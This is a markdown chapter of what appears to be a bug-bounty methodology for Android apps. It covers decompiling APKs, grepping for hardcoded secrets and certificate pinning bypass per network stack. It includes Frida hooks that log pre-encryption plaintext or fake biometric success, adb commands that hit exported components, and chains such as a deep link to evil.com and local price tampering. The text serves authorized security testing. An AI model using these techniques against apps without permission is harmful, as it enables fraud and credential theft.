# 11 — Depth-First Mobile (Static Map → Pinning Bypass → Instrumentation → Chains)

> **Doctrine:** [`Methodology/DEPTH_FIRST_DOCTRINE.md`](../Methodology/DEPTH_FIRST_DOCTRINE.md) · **Skills:** [`skills/mobile/`](../skills/mobile/) · **Scope law:** only reverse/test apps you are authorized to test.

## Operational Goal
99% of automation — including AI agents — never sees the real mobile attack surface: they run `apk-mitm`, proxy HTTPS, and scan it like a website. This workflow maps the surface **before the app ever runs**, gets through real pinning, then instruments the *business logic that runs on the client*.

## Phase 1 — Static Attack Surface Map (Before You Run the App)

```bash
apktool d app.apk -o app_out
jadx -d app_out_src app.apk
```

1. **AndroidManifest.xml is the checklist:**
   - `android:exported="true"` — every exported Activity/Service/Receiver/Provider is reachable with zero auth via `adb shell am start`. List all. → [`exported_component_abuse`](../skills/mobile/exported_component_abuse.md)
   - `intent-filter` VIEW + BROWSABLE — all deep links: IDORs waiting to happen. → [`deep_link_webview_abuse`](../skills/mobile/deep_link_webview_abuse.md)
   - `android:networkSecurityConfig` — pinning implementation + `cleartextTrafficPermitted`.
   - `queries` / `permissions` — hidden integrations (play billing, facebook sdk).
2. **Hidden APIs from code, not traffic:**
   ```bash
   grep -R "https://\|/api/\|/v1/\|/graphql" app_out_src/sources --include="*.java"
   grep -R "API_KEY\|SECRET\|Authorization" app_out_src/sources
   ```
   The JS/Dart bundle is the real API doc — `/api/admin/debug/clearCache` never called from the UI still exists. (Flutter: dart code lives in `libapp.so`.)
3. Cross-reference every static endpoint with the public API spec — undocumented mobile-only endpoints = shadow API. → [`shadow_api_exploitation`](../skills/auth_logic/shadow_api_exploitation.md)

## Phase 2 — Certificate Pinning Bypass by Stack (Identify First, Then Hook)

| Stack | Approach |
|---|---|
| OkHttp3 | Hook `okhttp3.CertificatePinner.check` + `conscrypt.TrustManagerImpl.verifyChain` |
| Custom TrustManager | Search `checkServerTrusted` in jadx output |
| Flutter | `objection` will FAIL — patch the APK with `reflutter` (rewrites ssl_verify in `libflutter.so`) and reinstall |
| Native (`libssl.so`) | `frida-trace -i "*SSL*"` + hook `SSL_CTX_set_custom_verify` → return 1 |

Start with `frida --codeshare akabe1/frida-multiple-unpinning` (covers ~90% of Java pinning); always pair with root/emulator detection bypass.

## Phase 3 — Dynamic Instrumentation: Business Logic on Device

1. **Hook crypto & storage — see plaintext before encryption/signing:**
   ```javascript
   Java.perform(function() {
     var AES = Java.use("javax.crypto.Cipher");
     AES.doFinal.overload('[B').implementation = function(b) {
       console.log("Plaintext: " + Java.use("java.lang.String").$new(b));
       return this.doFinal(b);
     };
   });
   ```
   → [`client_side_trust_abuse`](../skills/mobile/client_side_trust_abuse.md)
2. **Local trust decisions:** `isPremium` / `role` / `credits` in SharedPreferences/SQLite — flip with Frida; if the UI unlocks, the backend probably does not re-verify.
3. **Client-side validation abuse:** if `total = price * qty` is computed locally then sent to `/api/checkout`, hook it and send `total=1`. Local `couponValid()` → patch to `true`.
4. **Exported components — no traffic needed:**
   ```bash
   adb shell am start -n com.target/.DeepLinkActivity -d "targetapp://product/123/../../admin"
   adb shell content query --uri content://com.target.provider/secrets
   ```
   Test every exported component with empty, malformed, and admin intents.

## Phase 4 — Mobile-Specific Bug Classes

| Class | Chain | Skill |
|---|---|---|
| Deep link → WebView → XSS/RCE | `myapp://webview?url=https://evil.com` + `setJavaScriptEnabled(true)` + `addJavascriptInterface` | [`deep_link_webview_abuse`](../skills/mobile/deep_link_webview_abuse.md) |
| Deep-link IDOR | `myapp://invite?team_id=123&token=abc` — swap `team_id`, app calls the API without binding check | [`deep_link_webview_abuse`](../skills/mobile/deep_link_webview_abuse.md) |
| Broken biometric/local auth | Hook `BiometricPrompt.authenticate` → always true; server never re-checks | [`client_side_trust_abuse`](../skills/mobile/client_side_trust_abuse.md) |
| Insecure FileProvider/backup | `adb backup` / `adb pull databases/` — JWTs, unencrypted SQLite PII | [`exported_component_abuse`](../skills/mobile/exported_component_abuse.md) |

## Weekly Cadence (Mobile)
Day 1-2: static map (no proxy) → Day 3: pinning bypass + API map vs static diff → Day 4: Frida hooks (crypto/storage/premium) → Day 5: chaining (deep-link IDOR + local role tamper + replay).

## Transition
Chains go to **[07 — Chain Building](07_chain_building.md)**; report via **[09 — Reporting](09_reporting.md)**.
